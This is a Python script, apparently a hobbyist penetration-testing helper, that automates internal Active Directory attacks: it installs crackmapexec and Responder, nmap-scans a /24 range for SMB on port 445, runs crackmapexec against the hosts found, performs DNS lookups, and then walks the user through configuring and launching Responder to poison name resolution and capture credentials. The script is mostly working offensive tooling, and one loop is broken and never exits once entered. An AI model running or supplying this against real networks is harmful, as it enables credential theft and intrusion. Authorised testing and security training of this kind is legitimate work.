import os
import subprocess
import time
print('''
........................................................
.######..#####...######..........######..######..##..##.
.##......##..##..##................##....##......##..##.
.####....##..##..####..............##....####....######.
.##......##..##..##................##....##......##..##.
.##......#####...######..........######..######..##..##.
........................................................
By: Kair_wne''')

# dependencias
depen = input('Download dependencies? [yes/no] ')

if depen.lower() == "yes":
    os.system('sudo apt install crackmapexec')
    os.system('sudo apt install gnome-terminal')
    os.system('sudo apt install responder')
else:
    print('Ok..')

# Scanner
host = input('Internal HOST: ')
os.system(f'nmap --open -v -sS -p 445 -Pn {host}/24 -oG smb.txt')
os.system('cat smb.txt | grep "Up" | cut -d " " -f 2 > targets')

# crackmapexec
print('''
        ======================================================================================
        Because crackmapexe is giving an error in the code, let's open it in another terminal
        But once you discover all the hosts you can close the new terminal and continue
        ======================================================================================
      ''')

command = 'gnome-terminal -- bash -c "crackmapexec smb targets; exec bash"'

# Executa o comando no novo terminal
subprocess.Popen(command, shell=True)

time.sleep(5)

print('Scan the IPS you got')
def nmserver():
    klm = input('Sever AD Recon - AD ip: ')
    os.system(f'nmap -v --open -Pn {klm}')

continuar1 = input('Have More AD Hosts to scan[yes/no] ')

while continuar1.lower() == "yes":
    nmserver()
    continuar = input('Have More AD Hosts [yes/no] ')

port53 = input('Any 53 port in Ad host? [yes/no] ')
if port53 == "yes":    
    # Resolucao de DNS
    def dnsresol():
        print('DNS Resolution')
        first_host = input('Server AD Host: ')
        second_host = input('Second Host: ')
        os.system(f'host {first_host} {second_host}')
    dnsresol()

    # host
    continuar2 = input('Have More Hosts [yes/no] ')

    while continuar2.lower() == "yes":
        dnsresol()
        continuar2 = input('Have More Hosts [yes/no] ')
else:
    print("ok....")        

# Configuracao do Responder
print('''
      Now we need to manually configure responder with the scope IPs you found.
      
      cd /etc/responder
      nano responder.conf
      
      Go to the line that has "RespondTo = " and add the IPs of the scope you have
      
      I will open a new terminal so you can configure it. After that, you can
      come back here and type "yes"
''')
os.system('gnome-terminal')

respo = input('Continue [yes] ')

if respo.lower() == "yes":
    inter = input('Which network interface? [eth0/wlan0] ')
    os.chdir('/etc/responder')
    os.system(f'responder -I {inter} -Prv')
else:
    exit()